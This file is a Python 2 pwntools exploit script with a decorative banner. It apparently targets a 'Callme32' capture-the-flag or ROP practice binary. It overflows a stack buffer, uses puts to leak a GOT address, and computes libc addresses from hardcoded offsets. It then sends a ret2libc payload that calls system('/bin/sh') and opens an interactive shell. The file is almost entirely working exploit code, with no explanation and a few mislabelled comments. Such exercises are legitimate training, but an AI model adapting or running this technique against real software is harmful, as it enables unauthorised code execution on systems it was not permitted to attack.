#!/usr/bin/python
from struct import pack, unpack
import pwn



#######################################################
#              Art Configuration
#######################################################

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White
# Reset
Color_Off='\033[0m'       # Text Reset

art = BIRed+'''
+ ------------------------------------------------------------------ +
= +----------------------------------------------------------------+ =
= |                                                                | =
= |     _____ ___________   _____                                  | =
= |    /  ___/  ___| ___ \ |  __ \                                 | =
= |    \ `--.\ `--.| |_/ / | |  \/_ __ ___  _   _ _ __             | =
= |     `--. \`--. \ ___ \ | | __| '__/ _ \| | | | '_ \            | =
= |    /\__/ /\__/ / |_/ / | |_\ \ | | (_) | |_| | |_) |           | =
= |    \____/\____/\____/   \____/_|  \___/ \__,_| .__/            | =
= |                                              | |               | =
= |                                              |_|               | =
= +----------------------------------------------------------------+ ='''+Color_Off+BIBlue+'''
= +----------------------------------------------------------------+ =
= |                                                                | =
= |                   surajsinghbisht054@gmail.com                 | =
= |                      www.bitforestinfo.com                     | =
= |                                                                | =
= |                  Try Smart, Try Hard & Don't Cheat             | =
= +----------------------------------------------------------------+ =
+ ------------------------------------------------------------------ +
'''+Color_Off
print art

# Get Shell payload
def getshell(libc, sh_offset, exit_offset, sys_offset):
	libc = libc
	binsh = libc+sh_offset
	exitf = libc + exit_offset
	sysf = libc+ sys_offset
	print '[*] Libc Address   : ', hex(libc)
	print '[*] Binsh Address  : ', hex(binsh)
	print '[*] Exit Address   : ', hex(exitf)
	print '[*] System Address : ', hex(sysf)
        arg =  0x80485d0
        pay = ''
        pay += '\xcc'*40 # Buff
        pay += 'BBBB'
        pay += pack('I', sysf ) # puts # EIP
        pay += pack('I', exitf ) # pwnme
        pay += pack('I', binsh)
	return pay


# Stage One payload
def payload():
	arg =  0x80485d0 # puts@plt
	pay = ''
	pay += '\xcc'*40 # Buff
	pay += 'BBBB'
	pay += pack('I', 0x80485d0 ) # puts # EIP
	pay += pack('I', 0x80487b6 ) # pwnme
	pay += pack('I', 0x804a01c)  # _GLOBAL_OFFSET_TABLE_
	return pay


# Exploit
pwn.context.log_level='debug'

p = pwn.process(raw_input('[+] Insert Path of Callme32 Binary : ')[:-1])
print p.recvuntil('>')
p.sendline(payload())
s=p.readline()
addr = unpack('I', s[1:5])[0]
print '[*] Leak Addr From 0x804a01c : ', hex(addr)
n = getshell(addr,0x11658f ,-227184, -174400)
print p.readline()
p.sendline(n)
pwn.context.log_level='critical'
p.interactive()
